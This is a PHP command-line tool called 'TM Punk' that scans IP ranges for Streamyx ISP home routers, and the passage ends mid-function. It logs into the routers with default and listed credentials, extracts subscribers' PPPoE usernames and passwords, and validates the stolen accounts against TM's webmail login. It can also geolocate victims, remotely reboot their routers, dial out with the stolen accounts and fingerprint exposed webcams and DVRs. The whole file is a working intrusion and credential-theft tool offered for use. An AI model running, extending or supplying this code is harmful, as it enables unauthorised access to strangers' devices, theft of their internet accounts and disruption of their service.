<?php

/**
 * Debug Mode
 *
 * @var string $debug_mode -> Set this to on if you want to debug this script otherwise off it.
 *
 * Sometime script can't run, just on this section to see the
 * error and fix it yourself. ;)
 */
$debug_mode = "off";

/**
 * @var string $year -> Set this php year.
 */
$year = "2013";

/**
 * @var string $version -> Set this php version :).
 */
$version = "1.0";

/**
 * @var string $release -> Set this script release date.
 * Note : Year-Day-Month
 */
$release = "2013-06-29";

/**
 * @var string $user_agent -> Set php user agent when trying to request data with curl :).
 */
$user_agent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.11";

/**
 * @var string $author -> Author for this script ;).
 */
$author = "Mohd Shahril-AFnuM-Akif";

/**
 * @var bool $verbosa -> Set if you want to make verbose as default.
 */
$verbose = false;

if($debug_mode == "off"){
	error_reporting(0);
	set_time_limit(0);
	ini_set('error_log',NULL);
	ini_set('max_execution_time',0);
	ini_set('log_errors',0);
}else{
	error_reporting(E_ALL);
	ini_set('display_errors','On');
	ini_set('error_log','my_file.log');
	ini_set('error_log','');
	ini_set('error_log','/dev/null'); #linux
}

date_default_timezone_set('Asia/Kuala_Lumpur');  // Here is need for new PHP Version.

$il=0; // Use in save/log function

/**
 * CopyRighT ;)
 */
echo "\nTM Punk ".$version."  FuckCopyright (c) ".$year." ".$author." ".$release."\n";

/**
 * Version
 * @content string -> Give note for what you have done to this script.
 */
if(isset($argv[1]) && $argv[1] == "-v"){
	die("
		\rVersion 0.1 :-
		\r- Base Code Written..
		\r- Only can detect what router user use only.

		\rVersion 0.2 :-
		\r- Add automatik login code into D-Link, Innacom and Zyxel.

		\rVersion 0.3 :-
		\r- Add save into log function (Thank to Akif)
		\r- More interactive help.

		\rVersion 0.4 :-
		\r- Add ASUS DSL-N12U automatic login code.
		\r- Add multiple verification if default verification fail.

		\rVersion 0.5 :-
		\r- Change Curl User Agent into Chrome 23.
		\r- Add Streamyx Account Validation Scanner to check if that streamyx account
		\r  can login into streamyx web mail.
		\r- Add TP-Link automatic login code.

		\rVersion 0.6 :-
		\r- Add User Limit (user can now get what limit of downstream that user want).
		\r- Fix mistake when getting downstream/upstream on TP-Link TD-W8901G (i don't believe i make that mistake!)

		\rVersion 0.7 :-
		\r- Add Router Reboot function (D-Link, Innacom and TP-Link only !);

		\rVersion 0.7.1 :-
		\r- Add Router Reboot function for Zyxel.

		\rVersion 0.8 :-
		\r- Add verbose mode.

		\rVersion 0.8.1 :-
		\r- Add Optional Info.

		\rVersion 0.8.2 :-
		\r- Add ping timeout.
		\r- Add IP location tracker.

		\rVersion 0.8.3 :-
		\r- Repair file save function.
		\r- Minor change.
		
		\rVersion 0.9 :-
		\r- Website checking for online or offline function is now multithread.
		\r- Geo Location function is not default now. (You must select it in options)
		\r- Script scanning speed now up to 50%. (thank to curl multithread).
		
		\rVersion 0.9.1 :-
		\r- Minor Update (don't use much bandwidth for service verification after this)
		
		\rVersion 1.0 :-
		\r- Add auto streamyx connect (-con and -connect) (for Windows user only!)

		\rThank to : Akif (for log function) and other people who support.
	");
}

/**
 * Con (Connect) argument for reboot function
 */
if(in_array("-con", $argv, true)){
	if(strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN'){
		die("\nThis 'con' function only can be use in Windows OS only!\n");
	}
	$con = true;
	$key = array_search("-con", $argv);
	if(!in_array("-reboot", $argv, true)){
		die("\n'con' argument must be use with 'reboot' argument\n");
	}elseif(!isset($argv[$key+1])){
		die("\nCon Error ! -> Must set connection name");
	}
	$value = $key + 1;
	$name_connect_con = $argv[$value];
}

/**
 * Check if user input "-reboot" perimeter in this script.
 * If "-rebot" exist, then check for it value.
 * If the value can be accepted, then check data for that IP address
 * If this script can connect into that router, so this script automatically reboot that router.
 */
if(in_array("-reboot", $argv, true)){
	$key = array_search("-reboot", $argv);
	$value = $key + 1;
	$ip = $argv[$value];
	if(!filter_var($ip, FILTER_VALIDATE_IP)){ echo "\nIncorrect IP Address Format\n";die(); }
	if(check_old($ip) != TRUE){ echo "\nIP address ".$ip." didn't exist :(\n";die(); }
	$data = curl($ip);
	$info_return = checkdata($data);
	if($info_return == "Innacom"){
		if($con){ $data = Innacom($ip); }
		$result = innacom_reboot($ip);
		if($result == true){
			echo "\n".$ip." is rebooting now !\n";
		}else{
			echo "\nError when trying to reboot Router at ".$ip."!\n";
		}
		if($con){
			preg_match('/User \: (.*)/', $data, $username);
			preg_match('/Pass \: (.*)/', $data, $password);
			$connect = rasdial($name_connect_con, $username[1], $password[1]);
			if($connect == "name" && $connect != 1){
				echo "\n'".$name_connect_con."' is not exist in this computer!\n";
			}elseif($connect == "already" && $connect != 1){
				echo "\n'".$name_connect_con."' is already connected!\n";
			}elseif($connect == "up" && $connect != 1){
				echo "\nUsername '".$username[1]."' and password '".$password[1]."' is not recognized!\n";
			}else{
				echo "\nSuccessful Connect!\n";
			}
		}
	}elseif($info_return == "D-Link"){
		if(strpos($data, "SEA_1.01")){
			if($con){ $data = dlink($ip, "SEA_1.01"); }
			$result = dlink_reboot($ip, "SEA_1.01");
		}else{
			if($con){ $data = dlink($ip, ""); }
			$result = dlink_reboot($ip, "");
		}
		if($result == true){
			echo "\n".$ip." is rebooting now !\n";
		}else{
			echo "\nError when trying to reboot Router at ".$ip."!\n";
		}
		if($con){
			preg_match('/User \: (.*)/', $data, $username);
			preg_match('/Pass \: (.*)/', $data, $password);
			$connect = rasdial($name_connect_con, $username[1], $password[1]);
			if($connect == "name" && $connect != 1){
				echo "\n'".$name_connect_con."' is not exist in this computer!\n";
			}elseif($connect == "already" && $connect != 1){
				echo "\n'".$name_connect_con."' is already connected!\n";
			}elseif($connect == "up" && $connect != 1){
				echo "\nUsername '".$username[1]."' and password '".$password[1]."' is not recognized!\n";
			}else{
				echo "\nSuccessful Connect!\n";
			}
		}
	}elseif($info_return == "TP-Link TD-W8901G"){
		if($con){ $data = TpLink($ip); }
		$result = TpLink_reboot($ip);
		if($result == true){
			echo "\n".$ip." is rebooting now !\n";
		}else{
			echo "\nError when trying to reboot Router at ".$ip."!\n";
		}
		if($con){
			preg_match('/User \: (.*)/', $data, $username);
			preg_match('/Pass \: (.*)/', $data, $password);
			$connect = rasdial($name_connect_con, $username[1], $password[1]);
			if($connect == "name" && $connect != 1){
				echo "\n'".$name_connect_con."' is not exist in this computer!\n";
			}elseif($connect == "already" && $connect != 1){
				echo "\n'".$name_connect_con."' is already connected!\n";
			}elseif($connect == "up" && $connect != 1){
				echo "\nUsername '".$username[1]."' and password '".$password[1]."' is not recognized!\n";
			}else{
				echo "\nSuccessful Connect!\n";
			}
		}
	}elseif($info_return == "Zyxel P-600"){
		if($con){ $data = zyxel($ip); }
		$result = zyxel_reboot($ip);
		if($result == true){
			echo "\n".$ip." is rebooting now !\n";
		}else{
			echo "\nError when trying to reboot Router at ".$ip."!\n";
		}
		if($con){
			preg_match('/User \: (.*)/', $data, $username);
			preg_match('/Pass \: (.*)/', $data, $password);
			$connect = rasdial($name_connect_con, $username[1], $password[1]);
			if($connect == "name" && $connect != 1){
				echo "\n'".$name_connect_con."' is not exist in this computer!\n";
			}elseif($connect == "already" && $connect != 1){
				echo "\n'".$name_connect_con."' is already connected!\n";
			}elseif($connect == "up" && $connect != 1){
				echo "\nUsername '".$username[1]."' and password '".$password[1]."' is not recognized!\n";
			}else{
				echo "\nSuccessful Connect!\n";
			}
		}
	}else{
		echo "\nCan't determine what Router for ".$ip." :(\n";
	}
	die();
}

/**
 * Check if user input "-limit" perimeter in this script.
 * If "-limit" exist, then check for it value.
 * If the value can be accepted, then set $limit_bool into "set"
 * If value can't be accepted, then this script will automatic exit with error message
 */
if(in_array("-limit", $argv, true)){
	$find_key = array_search("-limit", $argv);
	$limit_value = $find_key + 1;
	if(strtolower($argv[$limit_value]) == "4mb"){
		$limit_bool = "set";
	}elseif(strtolower($argv[$limit_value]) == "2mb"){
		$limit_bool = "set";
	}elseif(strtolower($argv[$limit_value]) == "8mb"){
		$limit_bool = "set";
	}else{
		echo "\nMake sure limit perimeter is 4mb or 2mb !\n";
		echo "Exiting!\n";
		sleep(1);
		die();
	}
}

/**
 * Connect argument
 */
if(in_array("-connect", $argv, true)){
	if(strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN'){
		die("\nThis 'connect' function only can be use in Windows OS only!\n");
	}
	$find_key = array_search("-connect", $argv);
	if(!isset($argv[$find_key + 1]) || !isset($argv[$find_key + 2]) || !isset($argv[$find_key + 3])){
		die("\nPlease make sure connect argument have 3 perimeter!\n");
	}else{
		$name_connect = $argv[$find_key + 1];
		$username_connect = $argv[$find_key + 2];
		$password_connect = $argv[$find_key + 3];
		$connect = rasdial($name_connect, $username_connect, $password_connect);
		if($connect == "name" && $connect != 1){
			echo "\n'".$name_connect."' is not exist in this computer!\n";
		}elseif($connect == "already" && $connect != 1){
			echo "\n'".$name_connect."' is already connected!\n";
		}elseif($connect == "up" && $connect != 1){
			echo "\nUsername '".$username_connect."' and password '".$password_connect."' is not recognized!\n";
		}else{
			echo "\nSuccessful Connect!\n";
		}
	}
}

/**
 * Geolocation argument
 */
 
if(in_array("-geol", $argv, true)){
	$geol = true;
}


/**
 * Take save file argument
 */
 
if(in_array("-save", $argv, true)){
	$find_key = array_search("-save", $argv);
	$value = $find_key + 1;
	$filesave = $argv[$value];
}

/**
 * If user make $verbose as false in default
 * User can make it true back using command line argument
 */
if(in_array("-verbose", $argv, true)){
	$verbose = true;
}else{
	$verbose = false;
}

/**
 * If user want TM Punk to show optional info.
 * Then this is section of it :)
 */
if(in_array("-g", $argv, true)){
	$optional = true;
}else{
	$optional = false;
}

/**
 * Streamyx Account Validation Scanner
 *
 * First, this section will check if local computer has internet.
 * If internet didn't exist, then automatic exit with error message.
 * If internet exist, then continue, then script will look into provide log.
 * Then will make request one per one into streamyx webmail using curl request.
 * If respond is good, then username/password is accepted.
 */
if(isset($argv[1]) && $argv[1] == "-c"){
	
	if(!check_old("http://google.com/")){
		echo "\nYour computer look like didn't have internet connection !\n";
		echo "Internet is important if u want to use this service\n";
		echo "Exiting...\n";
		sleep(1);
		die();
	}
	
	if(empty($argv[2])) { die("\nPlease enter your log file\n"); }
	if(!file_exists($argv[2])) { echo "\nFile ".$argv[2]." can't be found\n";die(); }
	$getfile = file_get_contents($argv[2]);
	if($verbose){
		echo "\nGet content from ".$argv[2]." file\n";
	}
	$simpan = explode("Streamyx User : ", $getfile);
	foreach($simpan as $one){
		$data = explode("\n", $one);
		$tmp_p = explode("Streamyx Pass :", $data[1]);
		$tmp_u = explode("@", trim($data[0]));
		$username = trim($tmp_u[0]);
		$password = trim($tmp_p[1]);
		$post = "Login.Token1=".$username."&org=streamyx.com&Login.Token2=".$password."&Login=Log+In&module=LDAP&channelName=Login";
		$url = "http://webmail.tm.net.my/amserver/UI/Login";
		if($verbose){
			echo "Trying to connect with TM Mail Server...\n\n";
		}
		$tmp = curl($url, "", $post);
		if(strpos($tmp, "postprocess")){
			echo "\nEmail Username : ".$username."@streamyx\n";
			echo "Email Password : ".$password."\n";
		}else{
			if($verbose){
				echo "Fail when parse username and password to TM Mail Server\n";
			}
		}
	}
	die();
}

/**
 * Take IP and range code 
 */
 
if(in_array("-ip", $argv, true)){
	$find_key = array_search("-ip", $argv);
	$value = $find_key + 1;
	$ip = $argv[$value];
}

if(in_array("-range", $argv, true)){
	$find_key = array_search("-range", $argv);
	$value = $find_key + 1;
	$range = $argv[$value];
}
	

/**
 * Help File
 */
 
if($verbose){
	$verbose_check = "On";
}else{
	$verbose_check = "Off";
}
 
if(!isset($argv[1]) || $argv[1] == "-help" || $argv[1] == "-h" || $argv[1] == "/?"){
	die("
		\r USAGE :
		\r php \"{$argv[0]}\" -ip <ip> -range <range> (optional) -save <filename>
		\r php \"{$argv[0]}\" -c <filename>
		\r php \"{$argv[0]}\" -ip <ip> -range <range> -limit \"4m\"
		\r php \"{$argv[0]}\" -ip <ip> -range <range> -save -limit \"2m\"
		\r php \"{$argv[0]}\" -reboot <ip>
		 
		\r OPTIONS : 
		\r -ip <ip>	 : Specific target IP.
		\r -range <range> : Range scanner need to scan.
		 
		\r OPTIONAL :
		\r -g : Get optional info that you must know :)
		\r -save <filename> : Save result in specific file.
		\r -c <filename> : Check streamyx account if that account can use in 
		\r		 streamyx mail system.
		\r -v : Show what version of TM Punk you have now.
		\r -limit <speed> : Filter output from result. (In 2mb,4mb & 8mb).
		\r -connect <name> <username> <password> : Use for creating PPPOE connection
		\r -reboot <ip> : Automatically reboot those router ;).
		\r -con <name> : Use for creating PPPOE connection (for -reboot only!)
		\r -verbose : Verbose Mode. (Default = ".$verbose_check.")
		\r -geol : Get location of streamyx user.
		");
}

/**
 * Base Code
 *
 * This will be long, but I will try explain it :P.
 * First, this script will check user input (ip address) in argument 1.
 * If IP is accepted, then continue.
 * After that, it will check for user input (range) in argument 2.
 * If accepted, then continue.
 * Then this php will split the IP address and re-arrange it with user range.
 * After that, this script will start looping with provide user range.
 * Then PHP call another function to check data in looping IP address one by one.
 * If data is equal with function that been provide, then PHP will check user limit.
 * *- User limit is optional, you doesn't need to provide it if you don't want to limit anything.
 * *- If downstream of data is equal with user limit, then show the username/password/upstream/downstream.
 * If user doesn't provide any user limit, then php will show normally.
 * Any IP that doesn't equal with any data in provide function, then PHP will show IP with no result.
 * Then above process will do again and again until range is complete.
 */
if(isset($ip) && isset($range)){	
	$streamyx_ip = $ip;
	if(!filter_var($streamyx_ip, FILTER_VALIDATE_IP)){ echo "\nIncorrect IP Address Format\n";die(); }
	if(strpos($range, "-")){
		$range_if = explode("-", $range);
	}else{
		echo "\nIncorrect Range Format\n";die();
	}
	if($range_if[1] > 255){
		echo "\nIncorrect Range Format\n";die();
	}
	$a = explode(".", $streamyx_ip);
	if($verbose){
		echo "\nTry to parse IP address to valid input\n";
	}
	$a = $a[0].".".$a[1].".".$a[2];
	echo "\nScanning ".$a.".".$range."... \n\n";
	$b = explode("-", $range);
	$ole = range($b[0], $b[1]);
	$ol = count($ole);
	$give = "Status : Scan started for IP range ".$a.".".$range."... ";
	if(!empty($filesave)){
		file_put_contents($filesave, $give, FILE_APPEND);
	}
	$collect_ip = array();
	for($i = $range_if[0]; $i <= $range_if[1]; $i++){
		$collect_ip[] = "http://".$a.".".$i."/";
	}
	$data_check_return = check($collect_ip);
	$online = array();
	foreach($data_check_return as $b => $k){
		if(!empty($k)){
			$online[] = $b + 1;
		}
	}
	foreach($online as $i){
		if($verbose){
			echo "Checking for ".$a.".".$i." if online\n";
		}
		$data = $data_check_return[($i - 1)];
		if($verbose){
			echo "Checking data for ".$a.".".$i."\n";
		}
		$data_return = checkdata($data, $a.".".$i);
		if($data_return == "Innacom")
		{
			$tunjuk = Innacom($a.".".$i, $filesave);
			if(isset($limit_bool) && $limit_bool == "set"){
				$downstream = getdownstream($tunjuk);
				if(limit($downstream, $argv[$limit_value])){
					$il++;
					echo $a.".".$i." is ".$data_return."\n";
					echo "Ping time : ".ping($a.".".$i)."\n";
					if($geol){
						echo "Location : ".get_geolocation($a.".".$i)."\n";
					}
					echo $tunjuk;
					echo "\n";
				}
			}else{
				$il++;
				echo $a.".".$i." is ".$data_return."\n";
				echo "Ping time : ".ping($a.".".$i)."\n";
				if($geol){
					echo "Location : ".get_geolocation($a.".".$i)."\n";
				}
				echo $tunjuk;
				echo "\n";
			}
		}
		elseif($data_return == "ASUS DSL-N12U")
		{
			$tunjuk = asus($a.".".$i, $filesave);
			if(isset($limit_bool) && $limit_bool == "set"){
				$downstream = getdownstream($tunjuk);
				if(limit($downstream, $argv[$limit_value])){
					$il++;
					echo $a.".".$i." is ".$data_return."\n";
					echo "Ping time : ".ping($a.".".$i)."\n";
					if($geol){
						echo "Location : ".get_geolocation($a.".".$i)."\n";
					}
					echo $tunjuk;
					echo "\n";
				}
			}else{
				$il++;
				echo $a.".".$i." is ".$data_return."\n";
				echo "Ping time : ".ping($a.".".$i)."\n";
				if($geol){
					echo "Location : ".get_geolocation($a.".".$i)."\n";
				}
				echo $tunjuk;
				echo "\n";
			}
		}
		elseif($data_return == "TP-Link TD-W8901G")
		{
			$tunjuk = TpLink($a.".".$i, $filesave);
			if(isset($limit_bool) && $limit_bool == "set"){
				$downstream = getdownstream($tunjuk);
				if(limit($downstream, $argv[$limit_value])){
					$il++;
					echo $a.".".$i." is ".$data_return."\n";
					echo "Ping time : ".ping($a.".".$i)."\n";
					if($geol){
						echo "Location : ".get_geolocation($a.".".$i)."\n";
					}
					echo $tunjuk;
					echo "\n";
				}
			}else{
				$il++;
				echo $a.".".$i." is ".$data_return."\n";
				echo "Ping time : ".ping($a.".".$i)."\n";
				if($geol){
					echo "Location : ".get_geolocation($a.".".$i)."\n";
				}
				echo $tunjuk;
				echo "\n";
			}
		}
		elseif($data_return == "D-Link")
		{	
			if(strpos($data, "SEA_1.01")){
				$tunjuk = dlink($a.".".$i, "SEA_1.01", $filesave);
			}else{
				$tunjuk = dlink($a.".".$i, "", $filesave);
			}
			if(isset($limit_bool) && $limit_bool == "set"){
				$downstream = getdownstream($tunjuk);
				if(limit($downstream, $argv[$limit_value])){
					$il++;
					echo $a.".".$i." is ".$data_return."\n";
					echo "Ping time : ".ping($a.".".$i)."\n";
					if($geol){
						echo "Location : ".get_geolocation($a.".".$i)."\n";
					}
					echo $tunjuk;
					echo "\n";
				}
			}else{
				$il++;
				echo $a.".".$i." is ".$data_return."\n";
				echo "Ping time : ".ping($a.".".$i)."\n";
				if($geol){
					echo "Location : ".get_geolocation($a.".".$i)."\n";
				}
				echo $tunjuk;
				echo "\n";
			}
		}
		elseif($data_return == "Zyxel P-600")
		{	
			$tunjuk = zyxel($a.".".$i, $filesave);
			if(isset($limit_bool) && $limit_bool == "set"){
				$downstream = getdownstream($tunjuk);
				if(limit($downstream, $argv[$limit_value])){
					$il++;
					echo $a.".".$i." is ".$data_return."\n";
					echo "Ping time : ".ping($a.".".$i)."\n";
					if($geol){
						echo "Location : ".get_geolocation($a.".".$i)."\n";
					}
					echo $tunjuk;
					echo "\n";
				}
			}else{
				$il++;
				echo $a.".".$i." is ".$data_return."\n";
				echo "Ping time : ".ping($a.".".$i)."\n";
				if($geol){
					echo "Location : ".get_geolocation($a.".".$i)."\n";
				}
				echo $tunjuk;
				echo "\n";
			}
		}
		else
		{
			if(isset($data_return)){
				if($optional){
					echo $a.".".$i." is ".$data_return."\n";
					$il++;
					$give = "IP : $a.$i \r\nDevice : ".$data_return."\r\nStatus : Method not implemented\r\n";
					if(!empty($filesave)){
						file_put_contents($filesave, $give, FILE_APPEND);
					}
					echo "\n";
				}
			}else{
				if($optional){
					$il++;
					echo $a.".".$i." exist but no data for this IP\n";
						$give = "IP : $a.$i \r\nDevice : unknown\r\nStatus : Unknown device\r\n";
						if(!empty($filesave)){
							file_put_contents($filesave, $give, FILE_APPEND);
						}
					echo "\n";
				}
			}
		}
		if($verbose){
			echo $a.".".$i." if not exist or offline\n\n";
		}
	}
	$give = "Status : Scan ended.. total there are ".$il." IPs accessible out of ".$ol." IPs on range. \r\n";
	echo $give;
	if(!empty($filesave)){
		file_put_contents($filesave, $give, FILE_APPEND);
	}
	die();
}

/**
 * List of another verification if default verification is fail.
 * Note : username => password
 */
$list = array(
		"admin" => "tmadmin",
		"tmadmin" => "admin",
		"admin" => "admin",
	  	"tmuser" => "tmuser",
	  	"tmbusiness" => "tmbusiness",
	  	"tmuser" => "tmbusiness",
	  	"tmadmin" => "tmbusiness",
		"support" => "support"
	  );

/**
 * @param string array $url -> Check if host exist in port 80.
 * @return string array -> Return true if host exist.
 */
 
function check($data, $options = array()){
	$curly = array();
	$result = array();
	$mh = curl_multi_init();
	foreach($data as $id => $d) {
		$curly[$id] = curl_init();
		$url = (is_array($d) && !empty($d['url'])) ? $d['url'] : $d;
		curl_setopt($curly[$id], CURLOPT_URL, $url);
		curl_setopt($curly[$id], CURLOPT_HEADER, 0);
		curl_setopt($curly[$id], CURLOPT_RETURNTRANSFER, 1);
		if (is_array($d)) {
			if (!empty($d['post'])) {
				curl_setopt($curly[$id], CURLOPT_POST, 1);
				curl_setopt($curly[$id], CURLOPT_POSTFIELDS, $d['post']);
			}
		}
		curl_setopt($curly[$id],CURLOPT_TIMEOUT, 10);
		if (!empty($options)) {
			curl_setopt_array($curly[$id], $options);
		}
		curl_multi_add_handle($mh, $curly[$id]);
	}
	$running = null;
	do {
		curl_multi_exec($mh, $running);
	}
	while ($running > 0);
	foreach($curly as $id => $c) {
		$result[$id] = curl_multi_getcontent($c);
		curl_multi_remove_handle($mh, $c);
	}
	curl_multi_close($mh);
	return $result;
}
 
/**
 * Old version
 */
function check_old($url){
	global $verbose;
	if($verbose){
		echo "Trying to connect with ".$url."\n";
	}
	$ch=curl_init();
	curl_setopt($ch,CURLOPT_URL,$url );
	curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch,CURLOPT_VERBOSE,false);
	curl_setopt($ch,CURLOPT_TIMEOUT, 1);
	curl_setopt($ch,CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch,CURLOPT_SSLVERSION,3);
	curl_setopt($ch,CURLOPT_SSL_VERIFYHOST, FALSE);
	$page=curl_exec($ch);
	$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
	curl_close($ch);
	//return $httpcode;
	if($verbose){
		echo "Router in ".$url." return this code -> ".$httpcode."\n";
	}
	if($httpcode>=200 && $httpcode<402) return true;
	else return false;
}

/**
 * @param string $data -> ry to check other data after script can't detect any Router there
 * @return string -> Return Router data.
 */
function checkdata($data, $ip = ""){

	if(strpos($data, "parent.location=")){ // For IP that move to other location ;)
		$pecah = explode("parent.location='", $data);
		$pecah = explode("'", $pecah[1]);
		$get = curl($pecah[0], "", "");
		if(strpos($get, "Innacom")){
			return "Innacom";
		}elseif(strpos($get, "logo_dlink.jpg")){
			return "DSL-2640B Wireless Router";
		}elseif(strpos($get, "DSL-2750U")){
			return "DSL-2750U";
		}
	}elseif(strpos($data, "<A HREF='/login.rsp'>here</a></")){
		$pecah = cutstr($data, "HREF='", "'");
		$get = curl($ip.$pecah);
		if(strpos($get, "DVR LOGIN")){
			return "DVR LOGIN";
		}
	}elseif(strpos($data, "Asus")){
		return "ASUS DSL-N12U";
	}elseif(strpos($data, "TD-W8901G")){
		return "TP-Link TD-W8901G";
	}elseif(strpos($data, "D-Link")){
		return "D-Link";
	}elseif(strpos($data, "TM6841G")){
		return "Zyxel P-600";
	}elseif(strpos($data, "DVR remote management sytem")){
		return "DVR remote management system";
	}elseif(strpos($data, "IP Surveillance")){
		return "IP Surveillance System";
	}elseif(strpos($data, "Net Viewer D6 Series Web-Program")){
		return "Net Viewer D6 Series Web-Program";
	}elseif(strpos($data, "16 CH")){
		return "16 CH (camera surveillance maybe ? :] )";
	}elseif(strpos($data, "DVR Components Download")){
		return "DVR Web Client/Camera";
	}elseif(strpos($data, '<img src="images/user.gif" width="32" height="48"></TD>')){
		return "Web Camera";
	}elseif(strpos($data, "DVR LOGIN")){
		return "DVR Camera Login";
	}elseif(strpos($data, "PC DVR Web Client")){
		return "PC DVR Web Client";
	}elseif(strpos($data, "IDS_WEB_WEBCAM_LOGIN")){
		return "Webcam Login";
	}elseif(strpos($data, "NETSuveillance WEB")){
		return "NETSuveillance WEB";
	}elseif(strpos($data, "DSL Router")){
		return "DSL Router";
	}elseif(strpos($data, 'id="btnLive" onClick="openLive()"')){
		return "Remote Monitoring System";
	}elseif(strpos($data, "TD-W8961ND")){
		return "TP-Link TD-W8961ND";
	}elseif(strpos($data, "Web Application Manager")){
		return "Web Application Manager";
	}elseif(strpos($data, "BP Software")){
		return "BP Software";
	}elseif(strpos($data, "BattleLAN Network")){
		return "BattleLAN Network";
	}elseif(strpos($data, "WebDVR")){
		return "WebDVR";
	}elseif(strpos($data, "RouterOS")){
		return "RouterOS ";
	}elseif(strpos($data, "WebCam")){
		return "WebCam";
	}elseif(strpos($data, "DVR-04CH")){
		return "DVR-04CH";
	}elseif(strpos($data, "Network video client")){
		return "Network video client";
	}
}

/**
 * @param string $string -> Remove Curly Bracket from String
 */
function removecurly($string){
	$remove = str_replace("{", "", $string);
	$remove = str_replace("}", "", $remove);
	return $remove;
}

/**
 * @param string $name_connect -> Broadband name
 * @param string $username_connect -> Username that want to connect
 * @param string $password_connect -> Password for that username
 * @return string & boolean -> Return string if failed and boolean if success
 */
function rasdial($name, $username, $password){
	if(strpos(shell_exec('rasdial "'.$name.'"'), 'error 623')){
		return 'name';
	}
	$connect = shell_exec('rasdial "'.$name.'" "'.$username.'" "'.$password.'"');
	if(strpos($connect, 'already connected')){
		return 'already';
	}elseif(strpos($connect, 'error 691')){
		return 'up';
	}elseif(strpos($connect, 'Successfully connected')){
		return true;
	}
}

/**
 * Innacom function by AFnuM
 * @param string $ip -> Get ip then automatically get streamyx user info.
 * @return string -> Return streamyx user info.
 */
function Innacom($ip, $filesave = "")
{
	if(isset($ip))
	{
		global $list;
		global $verbose;

		$result = ""; 

		if($verbose){
			$result .= "Try to connect to Innacom router with default username & password\n";
		}
		$curl = curl("http://".$ip."/login.cgi?username=support&psd=support", "", "");

		//Using another verification
		if(strpos("Authentication fail", $curl)){
		if($verbose){
			$result .= "Default authentication fail, try with another\n";
		}
		  foreach($list as $username => $pass){
			  $curl = curl("http://".$ip."/login.cgi?username=".$username."&psd=".$pass."", "", "");
			  if(strpos("Authentication fail", $curl) === FALSE){
				if($verbose){
					$result .= "All authentication was failed!\n";
				}
				break;
			  }
		  }
		}

		if($verbose){
			$result .= "Authentication success ! Try to take data now !\n";
		}
		$cook = GetCookies($curl);
		$curl = curl("http://".$ip."/wancfg.cmd", $cook, "");
		$curl1 = curl("http://".$ip."/info.html", $cook, "");
		preg_match_all("/var obj2Items = '(.*)';/U", $curl, $f);
		preg_match_all("/var obj1Items = '(.*)';/U", $curl1, $f1);
		$exp = explode("-", $f[1][0]);
		$exp1 = explode("-", $f1[1][0]);
		if(!empty($exp[12]) && !empty($exp[13]))
		{
			$result .= "Streamyx User : ".removecurly($exp[12])."\n";
			$result .= "Streamyx Pass : ".removecurly($exp[13])."\n";
		}
		if(!empty($exp1[10]) && !empty($exp1[11]))
		{
			$result .= "Upstream : ".str_replace("000", "", removecurly($exp1[10]))."\n";
			$result .= "Downstream : ".str_replace("000", "", removecurly($exp1[11]))."\n";
		}
		else return false;

		if($verbose){
			$result .= "Take data success ! \n";
		}

		if(!empty($filesave) && !empty($exp[12])){
			$data = array(
					"IP" => $ip,
					"Router" => "Innacomm",
					"Streamyx User" => removecurly($exp[12]),
					"Streamyx Pass" => removecurly($exp[13]),
					"Upstream" => str_replace("000", "", removecurly($exp1[10])),
					"Downstream" => str_replace("000", "", removecurly($exp1[11]))
					);
					
			file_put_contents($filesave, "\r\n\r\n", FILE_APPEND);
			
			foreach($data as $name => $value){
				file_put_contents($filesave, "\r\n".$name." : ".$value, FILE_APPEND);
			}
		}
		
		return $result;
	}
}

/**
 * Innacom Reboot by Shahril
 * @param string $ip -> Get ip then automatically reboot the Router.
 * @return bool -> Return bool result info.
 */
function innacom_reboot($ip){

	global $list;
	global $verbose;

	//Login into Router
	if($verbose){
		echo "Try to connect to Innacom router with default username & password\n";
	}
	$curl = curl("http://".$ip."/login.cgi?username=support&psd=support", "", "");
	
	//Using another verification
	if(strpos("Authentication fail", $curl)){
		if($verbose){
			echo "Default authentication fail, try with another\n";
		}
		foreach($list as $username => $pass){
			$curl = curl("http://".$ip."/login.cgi?username=".$username."&psd=".$pass."", "", "");
			if(strpos("Authentication fail", $curl) === FALSE){
				if($verbose){
					echo "All authentication was failed!\n";
				}
				break;
			}
		}
	}
	
	if($verbose){
		echo "Authentication success ! Try to reboot that router now !\n";
	}
	$cook = GetCookies($curl);
	$reboot = curl("http://".$ip."/rebootinfo.cgi", $cook);
	if(strpos($reboot, "Router is rebooting")){ return true; }else{ return false; }
}

/**
 * D-Link function by Shahril
 * @param string $ip -> Get ip then automatically get streamyx user info.
 * @param string $type -> Check Router type.
 * @return string -> Return streamyx user info.
 */
function dlink($ip, $type, $filesave = ""){
	
	global $list;
	global $verbose;
	
	$result = "";

	if($type == "SEA_1.01") { $User = "admin"; }else{ $User = "tmadmin"; }
	
	//Login into Router
	if($verbose){
		$result .= "Try to connect to DLink router with default username & password\n";
	}
	$login = curl("http://".$ip."/index.html", "username=".$User.";password=tmadmin", "username=".$User."&password=tmadmin&loginfo=on");
	
	//Using another verification
	if(strpos("auth_fail.html", $login)){
		if($verbose){
			$result .= "Default authentication fail, try with another\n";
		}
	  foreach($list as $username => $pass){
		  $login = curl("http://".$ip."/index.html", "username=".$User.";password=".$pass, "username=".$User."&password=".$pass."&loginfo=on");
		  if(strpos("auth_fail.html", $login) === FALSE){
			if($verbose){
				$result .= "All authentication was failed!\n";
			}
			break;
		  }
	  }
	}
	
	if($verbose){
		$result .= "Authentication success ! Try to take data now !\n";
	}
	
	// Find Username & Password
	$data = curl("http://".$ip."/internet_js.html", "username=".$User."; password=tmadmin" , "");
	$data = explode("pppUserName.value = '", $data);
	$username = explode("';", $data[1]);
	$password = explode("pppPassword.value = '", $username[1]);
	//
	
	//Find Upstream & Downstream
	$data1 = curl("http://".$ip."/info.html", "username=".$User."; password=tmadmin" , "");
	$data1 = explode('Downstream Line Rate (Kbps):', $data1);
	$data1 = explode('document.write("<td>', $data1[1]);
	$downstream = explode('</td>");', $data1[1]);
	$upstream = explode('</td>");', $data1[2]);
	//
	
	//Variable for data
	$dl_user = $username[0];
	$dl_pass = $username[1];
	$dl_up = trim($upstream[0]);
	$dl_down = trim($downstream[0]);
	
	if(!empty($dl_user) && !empty($dl_pass)){
		$result .= "Streamyx User : ".$username[0]."\n";
